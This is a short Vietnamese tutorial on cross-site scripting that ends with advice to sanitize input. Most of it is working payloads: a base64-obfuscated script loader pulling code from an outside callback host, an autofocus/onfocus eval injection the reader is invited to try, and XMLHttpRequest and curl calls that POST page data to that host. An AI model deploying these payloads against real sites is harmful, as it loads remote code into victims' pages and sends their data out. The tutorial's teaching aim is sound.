---
title: (Vi) XSS attack sample
author: lk
---


**XSS attack là kỹ thuật tấn công khá phổ biến bên cạnh SQL injection. Hãy cùng xem thử một ví dụ mà attacker inject thành công một đọan mã độc vào hệ thống nhé!**


Đầu tiên, hãy chạy đoạn thử js này trong js console

```js
> atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vZDB4NS54c3MuaHQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7')

> 'var a=document.createElement("script");a.src="https://d0x5.xss.ht";document.body.appendChild(a);'
```
một vài browser hiện đại thì đã chặn việc chạy các đoạn mã độc như trên


```
> # thử eval đoạn mã độc phía trên 
> eval(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vZDB4NS54c3MuaHQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7'))

> VM91:1 This document requires 'TrustedScript' assignment and no 'default' policy for 'TrustedScript' has been defined.
(anonymous) @ VM91:1
VM91:1 Uncaught EvalError: Refused to evaluate a string as JavaScript because 'unsafe-eval' is not an allowed source of script in the following Content Security Policy directive: "script-src chrome://resources 'self'".
```


Nếu bạn tò mò, tận mắt thấy, hãy nhúng đoạn code dưới này vào file html bất kỳ nào đó, mở ở chế độ **private mode**
```
<input
    onfocus=eval(atob(this.id))
    id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vZDB4NS54c3MuaHQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7
 autofocus>
```
link đến thư viện mà attacker xài, https://d0x5.xss.ht/ . Biết đâu bạn có thể modify một vài thông tin gửi về attacker = việc modify data 
gửi về cho attacker trong hàm bên dưới
```
    var http = new XMLHttpRequest();
    var url = "https://d0x5.xss.ht/page_callback";
    http.open("POST", url, true);
    http.setRequestHeader("Content-type", "text/plain");
    http.onreadystatechange = function() {
        if(http.readyState == 4 && http.status == 200) {

        }
    }
    http.send( JSON.stringify( page_data ) );
}
```
Hoặc callback luôn bằng curl
```
> curl -v -XPOST 'https://d0x5.xss.ht/page_callback' -d'{"page_html":"fuckyou", "uri":"fuck you again"}'
```

**Hãy luôn sanitize input data có kiểu string ;) và kỹ hơn nữa thì nên sanitize data load từ database khi render html page.**
Hoặc nên dùng các thư viện ORM có hỗ trợ việc sanitize/ cast các malicious input data này.

Nếu bạn còn tò mò, hãy vọc vạch thêm từ đây https://xsshunter.com/
